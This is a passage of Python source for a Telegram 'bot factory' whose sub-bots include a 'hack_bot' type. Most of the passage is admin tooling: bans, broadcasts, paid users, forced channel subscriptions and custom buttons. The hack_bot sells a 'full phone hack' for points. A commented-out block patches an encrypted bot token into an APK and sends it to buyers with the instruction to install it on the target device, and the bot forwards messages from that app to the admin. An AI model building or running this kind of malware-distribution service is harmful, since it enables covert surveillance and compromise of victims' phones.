            bot_user_states[current_bot_username][user_id] = None
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

    elif data == "add_button":
        if bot_type == "hack_bot":
            keyboard = [
                [InlineKeyboardButton("زر فتح رابط خارجي 🌐", callback_data="add_button_external_link")],
                [InlineKeyboardButton("زر فتح رابط داخلي 🔗", callback_data="add_button_internal_link")],
                [InlineKeyboardButton("زر إرسال رسالة ✉️", callback_data="add_button_send_message")],
                [InlineKeyboardButton("عودة 🔙", callback_data="buttons_panel")]
            ]
            edit_message_text(context.bot, chat_id, message_id,
                            "اختر نوع الزر الذي تريد إضافته: 👇",
                            reply_markup=InlineKeyboardMarkup(keyboard))
            bot_settings["rembo_state"] = "add_button_type_selection"
            save_made_bot_settings(current_bot_username)
            bot_user_states[current_bot_username][user_id] = None
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

    elif data.startswith("add_button_"):
        if bot_type == "hack_bot":
            button_type = data.replace("add_button_", "")
            if button_type == "external_link":
                send_message(context.bot, chat_id, f"الرجاء إرسال اسم الزر: 🏷️")
                bot_user_states[current_bot_username][user_id] = {"action": "await_button_name", "type": "external_link"}
            elif button_type == "internal_link":
                send_message(context.bot, chat_id, f"الرجاء إرسال اسم الزر: 🏷️")
                bot_user_states[current_bot_username][user_id] = {"action": "await_button_name", "type": "internal_link"}
            elif button_type == "send_message":
                send_message(context.bot, chat_id, f"الرجاء إرسال اسم الزر: 🏷️")
                bot_user_states[current_bot_username][user_id] = {"action": "await_button_name", "type": "send_message"}
            bot_settings["rembo_state"] = "adding_button"
            save_made_bot_settings(current_bot_username)
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

    elif data == "delete_button":
        if bot_type == "hack_bot":
            custom_buttons = bot_settings["custom_buttons"]
            if not custom_buttons:
                send_message(context.bot, chat_id, "لا توجد أزرار مخصصة لحذفها. ℹ️",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("عودة 🔙", callback_data="buttons_panel")]]))
                return
            
            keyboard = []
            for i, btn in enumerate(custom_buttons):
                keyboard.append([InlineKeyboardButton(f"🗑️ {btn['name']}", callback_data=f"confirm_delete_custom_btn_{i}")])
            keyboard.append([InlineKeyboardButton("عودة 🔙", callback_data="buttons_panel")])
            
            edit_message_text(context.bot, chat_id, message_id,
                            "اختر الزر الذي تريد حذفه: 🗑️",
                            reply_markup=InlineKeyboardMarkup(keyboard))
            bot_settings["rembo_state"] = "deleting_button"
            save_made_bot_settings(current_bot_username)
            bot_user_states[current_bot_username][user_id] = None
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

    elif data.startswith("confirm_delete_custom_btn_"):
        if bot_type == "hack_bot":
            button_index = int(data.replace("confirm_delete_custom_btn_", ""))
            custom_buttons = bot_settings["custom_buttons"]
            if 0 <= button_index < len(custom_buttons):
                button_name = custom_buttons[button_index]["name"]
                keyboard = [
                    [InlineKeyboardButton("نعم ✅", callback_data=f"execute_delete_custom_btn_{button_index}")],
                    [InlineKeyboardButton("لا ❌", callback_data="delete_button")]
                ]
                edit_message_text(context.bot, chat_id, message_id,
                                f"هل أنت متأكد أنك تريد حذف الزر '{button_name}'؟ ❓",
                                reply_markup=InlineKeyboardMarkup(keyboard))
                bot_settings["rembo_state"] = "confirm_delete_button"
                save_made_bot_settings(current_bot_username)
                bot_user_states[current_bot_username][user_id] = None
            else:
                send_message(context.bot, chat_id, "زر غير صالح. ❌",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("عودة 🔙", callback_data="buttons_panel")]]))
                bot_settings["rembo_state"] = None
                save_made_bot_settings(current_bot_username)
                bot_user_states[current_bot_username][user_id] = None
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

    elif data.startswith("execute_delete_custom_btn_"):
        if bot_type == "hack_bot":
            button_index = int(data.replace("execute_delete_custom_btn_", ""))
            custom_buttons = bot_settings["custom_buttons"]
            if 0 <= button_index < len(custom_buttons):
                deleted_button = custom_buttons.pop(button_index)
                bot_settings["custom_buttons"] = custom_buttons
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم حذف الزر '{deleted_button['name']}' بنجاح. 🗑️",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة إلى قسم الأزرار 🔙", callback_data="buttons_panel")]]))
            else:
                send_message(context.bot, chat_id, "حدث خطأ أثناء حذف الزر. ❌",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة إلى قسم الأزرار 🔙", callback_data="buttons_panel")]]))
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
            bot_user_states[current_bot_username][user_id] = None
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

def handle_message_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    text = update.message.text.strip() if update.message.text else None
    document = update.message.document
    
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        logging.error(f"لم يتمكن من الحصول على اسم المستخدم للبوت بالتوكن {current_bot_token}. لا يمكن المتابعة.")
        send_message(context.bot, chat_id, "حدث خطأ في تحديد هوية البوت. يرجى المحاولة لاحقًا. 😔")
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data[current_bot_username]

    # Ensure bot_user_states is initialized for the current bot and user
    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    # تحديث وقت آخر تفاعل
    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    # NEW: التحقق من الاشتراك الإجباري لقناة المصنع الأساسية في كل تفاعل
    # هذا يمنع المستخدم من التفاعل مع البوت إذا لم يكن مشتركًا
    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لاستخدام هذا البوت.\n"
            keyboard = [[InlineKeyboardButton("اشترك في القناة", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            return

    # Handle APK messages forwarded from the app (only for hack_bot)
    if bot_type == "hack_bot" and update.message.forward_from and update.message.forward_from.id == YOUR_ADMIN_ID_FOR_APK:
        send_message(context.bot, chat_id, "تم استلام رسالتك من التطبيق. 📱")
        try:
            context.bot.forward_message(chat_id=admin_id, from_chat_id=chat_id, message_id=update.message.message_id)
            logging.info(f"تم توجيه رسالة APK إلى الأدمن {admin_id}.")
        except Exception as e:
            logging.error(f"خطأ في توجيه رسالة APK إلى الأدمن {admin_id}: {e}")
        return

    # Check if user is banned
    if user_id in bot_settings["banned_users"]:
        send_message(context.bot, chat_id, "أنت محظور من قبل المطور لا يمكنك استخدام البوت📛")
        return

    # Check bot status
    if bot_settings["bot_status"] == "off" and user_id != admin_id:
        send_message(context.bot, chat_id, "البوت متوقف حاليا لأغراض خاصة 🚨🚧")
        return

    # Check payment status
    if bot_settings["payment_status"] == "on" and user_id not in bot_settings["paid_users"] and user_id != admin_id:
        send_message(context.bot, chat_id,
                     "مرحبًا بكم! 🌟\n\nللاستفادة الكاملة من جميع ميزات وخدمات بوتنا المتقدمة، يُرجى تفعيل البوت من خلال شراء الاشتراك. ⚙️✨\n\nنحن نعمل بجد لضمان تقديم تجربة فريدة ومميزة لكم. 🚀\n\nشكراً لثقتكم بنا. 😊",
                     reply_markup=InlineKeyboardMarkup([
                         [InlineKeyboardButton("شراء الاشتراك", url=f"tg://user?id={admin_id}")]
                     ]))
        return

    # Handle /free command for points (only for hack_bot)
    if bot_type == "hack_bot" and text == "/free":
        user_points = bot_settings["points"].get(user_id, 0)
        send_message(context.bot, chat_id, f"عدد النقاط الذي حصلت عليها: {user_points} ✨")
        return

    # Handle /vip command for full phone hack (only for hack_bot)
    if bot_type == "hack_bot" and text == "/vip":
        user_points = bot_settings["points"].get(user_id, 0)
        required_points = bot_settings.get("payload_points_required", 0) # يمكن أن تكون 0
        
        if user_points >= required_points:
            send_message(context.bot, chat_id, "هذه الميزة تحت التطوير حاليًا. 🚧")
            # If you want to re-enable APK sending, uncomment the following block and remove the line above
            # send_message(context.bot, chat_id, "جاري تجهيز تطبيق الاختراق! 🛠️")
            
            # # تشفير التوكن الخاص بك
            # encrypted_token_for_apk = encrypt_token(YOUR_BOT_TOKEN_FOR_APK) # لا نحتاج لـ YOUR_ADMIN_ID_FOR_APK هنا
            
            # # تحديد مسار ملف الـ APK الجديد
            # output_apk_filename = f"hacked_app_{user_id}.apk"
            # output_apk_path = os.path.join(DATABASE_DIR, output_apk_filename)

            # # تعديل الـ APK بالتوكن المشفر
            # if modify_apk_with_token(ORIGINAL_APK_PATH, encrypted_token_for_apk, output_apk_path):
            #     # إرسال ملف الـ APK للمستخدم
            #     with open(output_apk_path, 'rb') as apk_file:
            #         context.bot.send_document(chat_id=chat_id, document=apk_file, caption="✅ تم تجهيز تطبيق الاختراق! قم بتثبيته على الجهاز المستهدف. 📱")
                
            #     # خصم النقاط
            #     bot_settings["points"][user_id] = user_points - required_points
            #     save_made_bot_settings(current_bot_username)
            #     send_message(context.bot, chat_id, f"تم خصم {required_points} نقطة. نقاطك المتبقية: {bot_settings['points'][user_id]} ✨")
                
            #     # تنبيه الأدمن الرئيسي
            #     if user_id != MAIN_ADMIN_ID:
            #         send_message(context.bot, MAIN_ADMIN_ID,
            #                      f"🔔 *إشعار: تم إرسال تطبيق الاختراق!* 🔔\n\n"
            #                      f"👤 *إلى المستخدم:* [{update.effective_user.first_name}](tg://user?id={user_id})\n"
            #                      f"🤖 *من البوت:* @{current_bot_username}\n"
            #                      f"تم خصم {required_points} نقطة من المستخدم.",
            #                      parse_mode=ParseMode.MARKDOWN)
            # else:
            #     send_message(context.bot, chat_id, "❌ حدث خطأ أثناء تجهيز تطبيق الاختراق. يرجى المحاولة لاحقًا.")
        else:
            send_message(context.bot, chat_id,
                         f"مرحبًا! هذه الخيارات مدفوعة بسعر {required_points} نقطة. يمكنك تجميع النقاط وفتحها مجانًا. 🌟\n"
                         f"نقاطك الحالية: {user_points} ✨\n"
                         f"استخدم الأمر /vip لفتح أوامر اختراق الهاتف كاملاً.",
                         reply_markup=get_full_phone_hack_keyboard(current_bot_username, user_id))
        return

    # Handle messages based on user state
    current_state = bot_user_states[current_bot_username].get(user_id)

    # --- Encryption Bot File Handling ---
    if bot_type == "encryption_bot":
        if isinstance(current_state, dict) and current_state.get("action") == "await_file_for_encryption" and document:
            enc_type = current_state["type"]
            send_message(context.bot, chat_id, f"⏳ جاري تشفير الملف بنوع {enc_type}... 🔐")
            try:
                file_id = document.file_id
                new_file = context.bot.get_file(file_id)
                downloaded_file_path = os.path.join(DATABASE_DIR, document.file_name)
                new_file.download(downloaded_file_path)

                with open(downloaded_file_path, 'rb') as f:
                    file_content = f.read()
                
                encrypted_content = encrypt_data(file_content, enc_type)
                
                encrypted_file_path = os.path.join(DATABASE_DIR, f"encrypted_{document.file_name}")
                with open(encrypted_file_path, 'wb') as f:
                    f.write(encrypted_content)
                
                with open(encrypted_file_path, 'rb') as f:
                    context.bot.send_document(chat_id=chat_id, document=f, caption=f"✅ تم تشفير الملف بنوع {enc_type}.")
                
                os.remove(downloaded_file_path)
                os.remove(encrypted_file_path)

            except Exception as e:
                logging.error(f"Error encrypting file: {e}")
                send_message(context.bot, chat_id, f"❌ حدث خطأ أثناء تشفير الملف: {e}")
            
            bot_user_states[current_bot_username][user_id] = None
            return

        elif isinstance(current_state, dict) and current_state.get("action") == "await_file_for_decryption" and document:
            enc_type = current_state["type"]
            send_message(context.bot, chat_id, f"⏳ جاري فك تشفير الملف بنوع {enc_type}... 🔓")
            try:
                file_id = document.file_id
                new_file = context.bot.get_file(file_id)
                downloaded_file_path = os.path.join(DATABASE_DIR, document.file_name)
                new_file.download(downloaded_file_path)

                with open(downloaded_file_path, 'rb') as f:
                    file_content = f.read()
                
                decrypted_content = decrypt_data(file_content, enc_type)
                
                decrypted_file_path = os.path.join(DATABASE_DIR, f"decrypted_{document.file_name}")
                with open(decrypted_file_path, 'wb') as f:
                    f.write(decrypted_content)
                
                with open(decrypted_file_path, 'rb') as f:
                    context.bot.send_document(chat_id=chat_id, document=f, caption=f"✅ تم فك تشفير الملف بنوع {enc_type}.")
                
                os.remove(downloaded_file_path)
                os.remove(decrypted_file_path)

            except Exception as e:
                logging.error(f"Error decrypting file: {e}")
                send_message(context.bot, chat_id, f"❌ حدث خطأ أثناء فك تشفير الملف: {e}")
            
            bot_user_states[current_bot_username][user_id] = None
            return
        
        elif isinstance(current_state, dict) and current_state.get("action") == "await_main_channel_link" and text:
            # Validate URL format
            if text.startswith("http://") or text.startswith("https://") or text.startswith("@"):
                bot_settings["main_channel_link"] = text
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم تعيين رابط القناة الأساسية: {text} 🫅")
                
                # Update admin keyboard to reflect changes
                send_message(context.bot, chat_id,
                             "مرحبًا! إليك أوامرك: ⚡📮\n\n1. إدارة المشترڪين والتحكم بهم. 👥\n2. إرسال إذاعات ورسائل موجهة. 📢\n3. ضبط إعدادات الاشتراك الإجباري. 💢\n4. تفعيل أو تعطيل التنبيهات. ✔️❎\n5. إدارة حالة البوت ووضع الاشتراك. 💰🆓",
                             reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
            else:
                send_message(context.bot, chat_id, "❌ الرجاء إرسال رابط قناة صحيح (يبدأ بـ http/https أو @).")
            
            bot_user_states[current_bot_username][user_id] = None
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
            return

    # --- Factory Bot Message Handling ---
    elif bot_type == "factory_bot":
        if isinstance(current_state, dict) and current_state.get("action") == "await_token_sub_bot":
            send_message(context.bot, chat_id, "⏳ جاري إعداد البوت الفرعي، يرجى الانتظار... 🚀")
            sub_bot_token = text
            sub_bot_type = current_state["bot_type"]
            try:
                bot_info_resp = requests.get(f"https://api.telegram.org/bot{sub_bot_token}/getMe").json()
                if not bot_info_resp.get("ok"):
                    send_message(context.bot, chat_id, "❌ التوكن غير صالح. يرجى التأكد من صحة التوكن وإعادة المحاولة.")
                    bot_user_states[current_bot_username][user_id] = None
                    return

                sub_bot_username = bot_info_resp["result"]["username"]
                
                # Store sub-bot data under the factory admin's ID
                sub_bots_list = created_bots.get(user_id, [])
                sub_bots_list.append({"token": sub_bot_token, "admin_id": user_id, "username": sub_bot_username, "bot_type": sub_bot_type})
                created_bots[user_id] = sub_bots_list

                # Save sub-bot's main data file
                sub_bot_data_file = os.path.join(DATABASE_DIR, f"{sub_bot_username}.json")
                with open(sub_bot_data_file, 'w') as f:
                    json.dump({"token": sub_bot_token, "admin_id": user_id, "bot_type": sub_bot_type}, f)
                
                # Save sub-bot's settings, including parent_factory_admin_id
                load_made_bot_settings(sub_bot_username)
                made_bot_data[sub_bot_username]["parent_factory_admin_id"] = admin_id
                # تطبيق حالة الاشتراك الإجباري للمصنع الأساسي على البوت الفرعي الجديد
                if FACTORY_MAIN_SUBSCRIPTION_ENABLED and FACTORY_MAIN_SUBSCRIPTION_CHANNEL not in made_bot_data[sub_bot_username]["channels"]:
                    made_bot_data[sub_bot_username]["channels"].append(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
                elif not FACTORY_MAIN_SUBSCRIPTION_ENABLED and FACTORY_MAIN_SUBSCRIPTION_CHANNEL in made_bot_data[sub_bot_username]["channels"]:
                    made_bot_data[sub_bot_username]["channels"].remove(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
                save_made_bot_settings(sub_bot_username)

                send_message(context.bot, chat_id, f"✅ تم تشغيل البوت الفرعي @{sub_bot_username} بنجاح! 🎉")
                bot_user_states[current_bot_username][user_id] = None
                
                # Run the sub-bot
                updater = run_made_bot(sub_bot_token, user_id, sub_bot_username, sub_bot_type)
                if updater:
                    running_made_bot_updaters[sub_bot_username] = updater

            except Exception as e:
                logging.error(f"Error setting up sub-bot with token {sub_bot_token}: {e}")
                send_message(context.bot, chat_id, "❌ حدث خطأ أثناء إعداد البوت الفرعي. يرجى المحاولة مرة أخرى.")
                bot_user_states[current_bot_username][user_id] = None
            return

        elif current_state and current_state.startswith("confirm_delete_sub_"):
            username_to_delete = current_state.split("_", 3)[3]
            if text == f"delete_sub {username_to_delete}":
                sub_bots_list = created_bots.get(user_id, [])
                created_bots[user_id] = [b for b in sub_bots_list if b["username"] != username_to_delete]
                
                sub_bot_data_file = os.path.join(DATABASE_DIR, f"{username_to_delete}.json")
                if os.path.exists(sub_bot_data_file):
                    os.remove(sub_bot_data_file)
                
                sub_bot_settings_file = os.path.join(DATABASE_DIR, f"{username_to_delete}_settings.json")
                if os.path.exists(sub_bot_settings_file):
                    os.remove(sub_bot_settings_file)

                if username_to_delete in running_made_bot_updaters:
                    running_made_bot_updaters[username_to_delete].stop()
                    del running_made_bot_updaters[username_to_delete]

                send_message(context.bot, chat_id, f"✅ تم حذف البوت الفرعي @{username_to_delete} بنجاح! 🗑️")
            else:
                send_message(context.bot, chat_id, "❌ أمر الحذف غير صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        elif current_state == "await_new_factory_admin_id_sub":
            try:
                new_sub_admin_id = int(text)
                factory_sub_admins = bot_settings.get("factory_sub_admins", [])
                if admin_id not in factory_sub_admins: # Add the factory owner as an admin by default
                    factory_sub_admins.append(admin_id)
                if new_sub_admin_id not in factory_sub_admins:
                    factory_sub_admins.append(new_sub_admin_id)
                    bot_settings["factory_sub_admins"] = factory_sub_admins
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم إضافة المستخدم {new_sub_admin_id} كأدمن جديد لهذا المصنع الفرعي. 👨‍💻")
                    send_message(context.bot, new_sub_admin_id, f"تهانينا! 🎉 لقد تم إضافتك كأدمن في المصنع الفرعي @{current_bot_username}. أرسل /start للوصول إلى لوحة التحكم. 🚀")
                else:
                    send_message(context.bot, chat_id, "هذا المستخدم هو أدمن بالفعل في هذا المصنع الفرعي. ℹ️")
            except ValueError:
                send_message(context.bot, chat_id, "❌ معرف المستخدم غير صالح. الرجاء إرسال رقم صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        elif current_state == "await_remove_factory_admin_id_sub":
            try:
                sub_admin_to_remove_id = int(text)
                factory_sub_admins = bot_settings.get("factory_sub_admins", [])
                if sub_admin_to_remove_id == admin_id:
                    send_message(context.bot, chat_id, "❌ لا يمكن حذف المالك الرئيسي لهذا المصنع الفرعي.")
                elif sub_admin_to_remove_id in factory_sub_admins:
                    factory_sub_admins.remove(sub_admin_to_remove_id)
                    bot_settings["factory_sub_admins"] = factory_sub_admins
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم حذف المستخدم {sub_admin_to_remove_id} كأدمن من هذا المصنع الفرعي. 🗑️")
                    send_message(context.bot, sub_admin_to_remove_id, f"لقد تم إزالتك من قائمة أدمنز المصنع الفرعي @{current_bot_username}. 😔")
                else:
                    send_message(context.bot, chat_id, "هذا المستخدم ليس أدمنًا في هذا المصنع الفرعي. ℹ️")
            except ValueError:
                send_message(context.bot, chat_id, "❌ معرف المستخدم غير صالح. الرجاء إرسال رقم صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        elif current_state == "await_broadcast_free_bots_message_sub":
            broadcast_message = text
            sent_count = 0
            failed_count = 0
            
            sub_bots_list = created_bots.get(admin_id, []) # Get bots created by this factory's admin
            for bot_info_sub in sub_bots_list:
                sub_bot_username = bot_info_sub["username"]
                load_made_bot_settings(sub_bot_username)
                sub_bot_settings = made_bot_data[sub_bot_username]
                
                if sub_bot_settings["payment_status"] == "free":
                    updater_instance = running_made_bot_updaters.get(sub_bot_username)
                    if updater_instance:
                        bot_instance = updater_instance.bot
                        members = sub_bot_settings["members"]
                        for member_id in members:
                            try:
                                send_message(bot_instance, member_id, broadcast_message)
                                sent_count += 1
                            except Exception as e:
                                logging.warning(f"Could not send broadcast to {member_id} in sub-bot @{sub_bot_username}: {e}")
                                failed_count += 1
                    else:
                        logging.warning(f"Sub-bot @{sub_bot_username} is not running, skipping broadcast.")

            send_message(context.bot, chat_id,
                         f"✅ تم إرسال الإذاعة إلى البوتات المجانية المصنوعة من هذا المصنع الفرعي.\n"
                         f"عدد الرسائل المرسلة بنجاح: {sent_count} 🚀\n"
                         f"عدد الرسائل الفاشلة: {failed_count} 💔")
            bot_user_states[current_bot_username][user_id] = None
            return
        
        elif current_state == "await_paid_features_sub_bot_token":
            sub_bot_token = text
            sub_bot_username = get_bot_username_from_token(sub_bot_token)
            if sub_bot_username:
                load_made_bot_settings(sub_bot_username)
                sub_bot_settings = made_bot_data[sub_bot_username]
                
                # Set a flag or modify a setting to enable custom buttons regardless of member count
                sub_bot_settings["custom_buttons_enabled_by_admin"] = True
                save_made_bot_settings(sub_bot_username)
                
                send_message(context.bot, chat_id, f"✅ تم تفعيل المميزات المدفوعة (قسم الأزرار) للبوت الفرعي @{sub_bot_username} بنجاح. 💎")
                bot_user_states[current_bot_username][user_id] = None
            else:
                send_message(context.bot, chat_id, "❌ توكن البوت الفرعي غير صالح أو لم يتم العثور على البوت. يرجى المحاولة مرة أخرى.")
                bot_user_states[current_bot_username][user_id] = None
            return

    # --- Common Admin/User States ---
    if current_state == "await_unban_id":
        try:
            target_id = int(text)
            if target_id in bot_settings["banned_users"]:
                bot_settings["banned_users"].remove(target_id)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم إلغاء حظر المستخدم {target_id} بنجاح. 🔓")
            else:
                send_message(context.bot, chat_id, "هذا العضو ليس محظورًا. ℹ️")
        except ValueError:
            send_message(context.bot, chat_id, "الرجاء إرسال ايدي رقمي صحيح. 🔢")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        return

    elif current_state == "await_ban_id":
        try:
            target_id = int(text)
            if target_id not in bot_settings["banned_users"]:
                bot_settings["banned_users"].append(target_id)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم حظر المستخدم {target_id} بنجاح. 🚫")
            else:
                send_message(context.bot, chat_id, "هذا العضو محظور بالفعل. ℹ️")
        except ValueError:
            send_message(context.bot, chat_id, "الرجاء إرسال ايدي رقمي صحيح. 🔢")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        return

    elif current_state == "await_broadcast_message":
        sent_count = 0
        failed_count = 0
        for member_id in bot_settings["members"]:
            try:
                send_message(context.bot, member_id, text)
                sent_count += 1
            except Exception as e:
                logging.warning(f"لم يتمكن من إرسال الإذاعة إلى {member_id}: {e}")
                failed_count += 1
        send_message(context.bot, chat_id, f"✅ تم النشر بنجاح! ✔️\nالمرسلة: {sent_count} 🚀, الفاشلة: {failed_count} 💔")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإذاعة رسالة في البوت @{current_bot_username}.\nالمرسلة: {sent_count}, الفاشلة: {failed_count}.",
                         parse_mode=ParseMode.MARKDOWN)
        return

    elif current_state == "await_forward_message":
        if update.message.forward_from_chat or update.message.forward_from:
            sent_count = 0
            failed_count = 0
            for member_id in bot_settings["members"]:
                try:
                    context.bot.forward_message(chat_id=member_id, from_chat_id=chat_id, message_id=update.message.message_id)
                    sent_count += 1
                except Exception as e:
                    logging.warning(f"لم يتمكن من توجيه الرسالة إلى {member_id}: {e}")
                    failed_count += 1
            send_message(context.bot, chat_id, f"✅ تم التوجيه بنجاح! 🔰\nالمرسلة: {sent_count} 🚀, الفاشلة: {failed_count} 💔")
            bot_user_states[current_bot_username][user_id] = None
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
            if user_id != MAIN_ADMIN_ID:
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بتوجيه رسالة في البوت @{current_bot_username}.\nالمرسلة: {sent_count}, الفاشلة: {failed_count}.",
                             parse_mode=ParseMode.MARKDOWN)
        else:
            send_message(context.bot, chat_id, "الرجاء توجيه رسالة. 🔄")
        return

    elif current_state == "await_remove_channel":
        channel_id = text
        if channel_id in bot_settings["channels"]:
            bot_settings["channels"].remove(channel_id)
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, f"✅ تم إزالة القناة {channel_id} من الاشتراك الإجباري. 🔱")
            if user_id != MAIN_ADMIN_ID:
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بحذف القناة {channel_id} من الاشتراك الإجباري في البوت @{current_bot_username}.",
                             parse_mode=ParseMode.MARKDOWN)
        else:
            send_message(context.bot, chat_id, "هذه القناة ليست ضمن قنوات الاشتراك الإجباري. ℹ️")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        return

    elif current_state == "await_add_paid_user":
        try:
            target_id = int(text)
            if target_id not in bot_settings["paid_users"]:
                bot_settings["paid_users"].append(target_id)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم إضافة المستخدم {target_id} إلى قائمة المدفوعين. 💰")
                if user_id != MAIN_ADMIN_ID:
                    send_message(context.bot, MAIN_ADMIN_ID,
                                 f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإضافة المستخدم [{target_id}](tg://user?id={target_id}) إلى قائمة المدفوعين في البوت @{current_bot_username}.",
                                 parse_mode=ParseMode.MARKDOWN)
            else:
                send_message(context.bot, chat_id, "هذا العضو موجود بالفعل في قائمة المدفوعين. ℹ️")
        except ValueError:
            send_message(context.bot, chat_id, "الرجاء إرسال ايدي رقمي صحيح. 🔢")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        return

    elif current_state == "await_remove_paid_user":
        try:
            target_id = int(text)
            if target_id in bot_settings["paid_users"]:
                bot_settings["paid_users"].remove(target_id)
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم إزالة المستخدم {target_id} من قائمة المدفوعين. 🆓")
                if user_id != MAIN_ADMIN_ID:
                    send_message(context.bot, MAIN_ADMIN_ID,
                                 f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإزالة المستخدم [{target_id}](tg://user?id={target_id}) من قائمة المدفوعين في البوت @{current_bot_username}.",
                                 parse_mode=ParseMode.MARKDOWN)
            else:
                send_message(context.bot, chat_id, "هذا العضو ليس في قائمة المدفوعين. ℹ️")
        except ValueError:
            send_message(context.bot, chat_id, "الرجاء إرسال ايدي رقمي صحيح. 🔢")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        return

    elif current_state == "await_add_channel":
        channel_id = text
        if channel_id not in bot_settings["channels"]:
            bot_settings["channels"].append(channel_id)
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, f"✅ تم إضافة القناة {channel_id} إلى الاشتراك الإجباري. 💢")
            if user_id != MAIN_ADMIN_ID:
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإضافة القناة {channel_id} إلى الاشتراك الإجباري في البوت @{current_bot_username}.",
                             parse_mode=ParseMode.MARKDOWN)
        else:
            send_message(context.bot, chat_id, "هذه القناة مضافة بالفعل. ℹ️")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        return

    elif current_state == "await_start_message":
        bot_settings["start_message"] = text
        save_made_bot_settings(current_bot_username)
        send_message(context.bot, chat_id, "✅ تم تحديث رسالة البدء بنجاح! 📝")
        bot_user_states[current_bot_username][user_id] = None
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بتغيير رسالة البدء في البوت @{current_bot_username}.",
                         parse_mode=ParseMode.MARKDOWN)
        return

    elif current_state == "await_payload_points": # Only for hack_bot
        if bot_type == "hack_bot":
            try:
                points = int(text)
                if points >= 0: # يمكن أن تكون 0
                    bot_settings["payload_points_required"] = points
                    save_made_bot_settings(current_bot_username)
                    send_message(context.bot, chat_id, f"✅ تم تعيين عدد النقاط المطلوبة لميزة اختراق الهاتف كاملاً إلى {points}. 🔢")
                    if user_id != MAIN_ADMIN_ID:
